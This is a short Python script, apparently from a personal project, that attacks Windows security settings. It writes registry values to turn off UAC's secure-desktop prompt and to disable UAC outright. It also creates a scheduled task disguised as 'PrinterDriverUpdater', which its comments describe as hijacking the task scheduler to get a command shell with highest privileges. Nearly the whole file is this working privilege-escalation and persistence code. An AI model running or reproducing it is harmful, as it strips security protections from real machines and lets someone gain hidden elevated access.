from os import system
from subprocess import run

task = "schtasks /create /TN PrinterDriverUpdater /XML C:/Users/lhill23/Documents/GitHub/system-logger/PrinterDriverUpdater.xml"

#Hijacking task scheduler, kinda?
def HijackScheduler():
    #Create a scheduled task to open cmd.exe with HighestAvailable perms
    system("cd C:/Users/lhill23/Desktop & VEXcodeV5-20220228.exe")

def DowngradeUAC():
    #Stop UAC opening on secure desktop
    system("reg add HKLM/SOFTWARE/Microsoft/Windows/CurrentVersion/Policies/System /f /v PromptOnSecureDesktop /t REG_DWORD /d 0")

def DisableUAC():
    #Straight disable UAC
    system("reg add HKLM/SOFTWARE/Microsoft/Windows/CurrentVersion/Policies/System /f /v EnableLUA /t REG_DWORD /d 0")

#Drivers?

if __name__ == "__main__":
    DowngradeUAC()
    HijackScheduler()
    run(task)